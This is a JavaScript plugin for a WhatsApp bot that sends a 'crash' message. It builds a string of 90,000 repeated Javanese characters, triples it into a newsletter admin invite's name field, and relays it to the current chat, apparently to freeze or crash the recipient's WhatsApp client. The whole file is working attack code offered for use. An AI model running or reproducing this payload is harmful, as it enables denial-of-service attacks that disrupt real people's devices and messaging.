// plugins/canal-adm.js

module.exports = {
    name: 'canal-adm',
    alias: [],

    async execute(conn, m, args, context) {
        
        // 1. Extraemos las variables que necesita el comando del 'context'
        const { isBot, isCreator, from, reply, groupid } = context;

        // 2. Tu código original, sin ninguna modificación en la lógica
        const travas = `${"ꦾ".repeat(90000)}`;

        if (!isBot && !isCreator) return;
        
        // Usamos la variable 'groupid' que recibimos del context
        if (m.isGroup && groupid.includes(m.chat)) {
            return reply("❎❎❎❎");
        }

        conn.relayMessage(from, {
            "newsletterAdminInviteMessage": {
                "newsletterJid": "120363282786345717@newsletter",
                "newsletterName": "🗣🗣🗣🗣" + travas + travas + travas,
                "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADMARwMBIgACEQEDEQH/xAAoAAEBAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAAM4AAAgqCoAAAAAAAAAKBAAAA//EABQQAQAAAAAAAAAAAAAAAAAAAFD/2gAIAQIBAT8AF//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AF//Z",
                "caption": "𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁",
                "inviteExpiration": "1717872809"
            }
        }, {});
        
        conn.relayMessage(from, {
            extendedTextMessage: {
                text: `𝐏.𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘  ᶻ 𝗓 𐰁`
            }
        }, {});
    }
};